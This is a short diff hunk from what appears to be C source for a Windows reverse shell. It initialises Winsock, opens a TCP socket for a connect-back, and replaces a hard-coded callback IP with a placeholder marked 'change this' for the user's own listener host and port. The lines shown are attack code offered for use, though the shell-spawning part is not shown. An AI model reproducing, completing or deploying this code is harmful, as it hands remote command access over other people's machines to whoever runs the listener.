@@ -13,8 +13,8 @@ int main()
     PROCESS_INFORMATION pi;
     int connection;
     char RecvServer[512];
-    char ip_addr[] = "192.168.11.128";
-    int port = 8000;
+    char ip_addr[] = "127.0.0.1"; // <-- change this
+    int port = 8000; // <-- change this
 
     WSAStartup(MAKEWORD(2,2), &wsa);  // winsock initalisation  
     shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL); 
